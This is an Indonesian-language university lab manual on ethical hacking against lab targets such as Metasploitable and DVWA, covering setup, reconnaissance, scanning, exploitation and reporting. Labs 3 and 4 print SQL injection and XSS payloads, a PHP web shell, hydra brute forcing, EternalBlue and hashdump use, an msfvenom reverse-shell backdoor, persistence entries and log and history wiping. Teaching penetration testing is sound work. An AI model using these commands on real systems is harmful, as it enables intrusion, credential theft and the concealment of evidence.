# Praktikum Modul 2: Metodologi Ethical Hacking

## Pendahuluan

Praktikum ini dirancang untuk memberikan pengalaman hands-on dalam menerapkan metodologi ethical hacking. Melalui serangkaian latihan terstruktur, siswa akan mempelajari dan mempraktikkan berbagai teknik dan tools yang umum digunakan dalam pengujian keamanan sistem.

## Tujuan Pembelajaran

Setelah menyelesaikan praktikum ini, siswa diharapkan mampu:
1. Mengimplementasikan metodologi ethical hacking secara sistematis
2. Menggunakan tools pengujian keamanan dengan efektif dan bertanggung jawab
3. Melakukan dokumentasi dan pelaporan hasil pengujian secara profesional
4. Menerapkan strategi pertahanan berdasarkan temuan pengujian

## Persiapan Lab Environment

### A. Setup VirtualBox dan Kali Linux

1. **Instalasi VirtualBox**
   ```bash
   # Download VirtualBox dari website resmi
   https://www.virtualbox.org/wiki/Downloads

   # Verifikasi instalasi
   VBoxManage --version
   ```

2. **Konfigurasi Virtual Machine**
   - RAM: Minimal 4GB
   - Storage: 50GB
   - Network: NAT + Host-only
   - Display: Enable 3D Acceleration
   
3. **Instalasi Kali Linux**
   ```bash
   # Verifikasi ISO
   sha256sum kali-linux-2024.1-installer-amd64.iso
   
   # Post-installation setup
   sudo apt update
   sudo apt upgrade
   sudo apt install -y virtualbox-guest-x11
   ```

### B. Setup Target Machines

1. **Metasploitable Setup**
   ```bash
   # Download Metasploitable
   wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip
   
   # Verifikasi dan ekstrak
   unzip metasploitable-linux-2.0.0.zip
   ```

2. **DVWA Setup**
   ```bash
   # Clone DVWA repository
   git clone https://github.com/digininja/DVWA.git
   
   # Konfigurasi database
   cp config/config.inc.php.dist config/config.inc.php
   ```

## Lab 1: Information Gathering

### A. Passive Reconnaissance

1. **WHOIS Enumeration**
   ```bash
   # Basic WHOIS query
   whois example.com
   
   # Detailed query
   whois -h whois.iana.org example.com
   ```

2. **DNS Information**
   ```bash
   # DNS lookup
   dig example.com ANY
   
   # Reverse DNS
   dig -x 192.168.1.1
   ```

3. **Google Dorks**
   - site:example.com filetype:pdf
   - inurl:admin site:example.com
   - intitle:"index of" site:example.com

### B. Active Reconnaissance

1. **Network Scanning dengan Nmap**
   ```bash
   # Host discovery
   sudo nmap -sn 192.168.1.0/24
   
   # Comprehensive scan
   sudo nmap -sS -sV -O -p- 192.168.1.100
   
   # Script scanning
   sudo nmap -sC -sV 192.168.1.100
   ```

2. **Web Application Analysis**
   ```bash
   # Directory enumeration
   gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
   
   # Nikto scan
   nikto -h http://target
   ```

## Lab 2: Vulnerability Assessment

### A. Automated Scanning

1. **OpenVAS Setup dan Scanning**
   ```bash
   # Install OpenVAS
   sudo apt install openvas
   
   # Setup
   sudo gvm-setup
   
   # Start service
   sudo gvm-start
   ```

2. **Nessus Essentials**
   ```bash
   # Download dan install
   curl -O https://www.tenable.com/downloads/nessus/Nessus-10.5.0-debian9_amd64.deb
   sudo dpkg -i Nessus-10.5.0-debian9_amd64.deb
   
   # Start service
   sudo systemctl start nessusd
   ```

### B. Manual Testing

1. **Web Application Testing**
   ```bash
   # SQL Injection
   sqlmap -u "http://target/page.php?id=1" --dbs
   
   # XSS Testing
   <script>alert('XSS')</script>
   ```

2. **Network Service Testing**
   ```bash
   # SMB Enumeration
   enum4linux -a 192.168.1.100
   
   # SSH Testing
   hydra -l admin -P wordlist.txt ssh://192.168.1.100
   ```

## Lab 3: Gaining Access

### A. Metasploit Framework

1. **Basic Usage**
   ```bash
   # Start Metasploit
   msfconsole
   
   # Search exploits
   search type:exploit platform:windows
   
   # Use exploit
   use exploit/windows/smb/ms17_010_eternalblue
   ```

2. **Post Exploitation**
   ```bash
   # Privilege Escalation
   run post/multi/recon/local_exploit_suggester
   
   # Harvesting credentials
   run post/windows/gather/hashdump
   ```

### B. Web Application Attacks

1. **SQL Injection**
   ```bash
   # Manual testing
   ' OR '1'='1
   ' UNION SELECT null,null,@@version--
   
   # Automated testing
   sqlmap -u "http://target/login.php" --forms --dump
   ```

2. **File Upload Vulnerabilities**
   ```php
   <?php
   echo "Malicious file content";
   system($_GET['cmd']);
   ?>
   ```

## Lab 4: Post Exploitation

### A. Maintaining Access

1. **Backdoor Creation**
   ```bash
   # Generate payload
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > backdoor.exe
   
   # Setup listener
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   ```

2. **Persistence Mechanisms**
   ```bash
   # Windows startup
   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\backdoor.exe"
   
   # Linux cron job
   echo "* * * * * /usr/local/bin/backdoor" >> /etc/crontab
   ```

### B. Covering Tracks

1. **Log Cleaning**
   ```bash
   # Clear Windows logs
   wevtutil cl System
   wevtutil cl Security
   
   # Clear Linux logs
   echo > /var/log/auth.log
   echo > /var/log/syslog
   ```

2. **Anti-forensics**
   ```bash
   # Secure delete files
   srm -vz sensitive_file
   
   # Clear bash history
   history -c
   rm ~/.bash_history
   ```

## Lab 5: Documentation dan Reporting

### A. Evidence Collection

1. **Screenshot dan Screen Recording**
   ```bash
   # Screenshot
   import -window root screenshot.png
   
   # Screen recording
   ffmpeg -f x11grab -s 1920x1080 -i :0.0 output.mkv
   ```

2. **Network Traffic Capture**
   ```bash
   # Start capture
   tcpdump -i eth0 -w capture.pcap
   
   # Analyze capture
   wireshark capture.pcap
   ```

### B. Report Writing

1. **Template Report**
   ```markdown
   # Penetration Test Report
   
   ## Executive Summary
   [Brief overview of findings]
   
   ## Methodology
   [Detail steps taken]
   
   ## Findings
   [List vulnerabilities found]
   
   ## Recommendations
   [Suggest fixes]
   ```

2. **Risk Assessment Matrix**
   | Severity | Likelihood | Risk Level |
   |----------|------------|------------|
   | High     | High       | Critical   |
   | High     | Low        | Medium     |
   | Low      | High       | Medium     |
   | Low      | Low        | Low        |

## Evaluasi

### A. Kriteria Penilaian

1. **Kemampuan Teknis (40%)**
   - Penggunaan tools
   - Identifikasi vulnerabilities
   - Eksploitasi
   - Post-exploitation

2. **Dokumentasi (30%)**
   - Kelengkapan laporan
   - Kualitas screenshot
   - Penjelasan teknis
   - Rekomendasi

3. **Metodologi (30%)**
   - Sistematika pengujian
   - Efisiensi waktu
   - Kreativitas
   - Problem solving

### B. Deliverables

1. **Lab Report**
   - Format: PDF
   - Minimal 10 halaman
   - Include screenshots
   - Include command outputs

2. **Presentasi**
   - 15 menit presentasi
   - 5 menit Q&A
   - Demo if applicable
   - Slide deck

## Referensi

1. CEH (Certified Ethical Hacker) Lab Manual
2. OWASP Testing Guide v4.0
3. Penetration Testing: A Hands-On Introduction to Hacking
4. The Web Application Hacker's Handbook
5. Red Team Field Manual (RTFM)
6. Metasploit: The Penetration Tester's Guide

## Appendix

### A. Troubleshooting Guide

1. **VirtualBox Issues**
   ```bash
   # Fix kernel driver
   sudo rcvboxdrv setup
   
   # Fix network
   sudo modprobe vboxnetflt
   ```

2. **Kali Linux Issues**
   ```bash
   # Fix broken packages
   sudo apt --fix-broken install
   
   # Update sources
   sudo apt update --fix-missing
   ```

### B. Cheat Sheets

1. **Nmap**
   ```bash
   # Quick scan
   nmap -T4 -F 192.168.1.0/24
   
   # Full scan
   nmap -sS -sV -O -p- -T4 192.168.1.100
   ```

2. **Metasploit**
   ```bash
   # Basic commands
   show exploits
   show payloads
   show options
   set RHOSTS target
   exploit
   ```
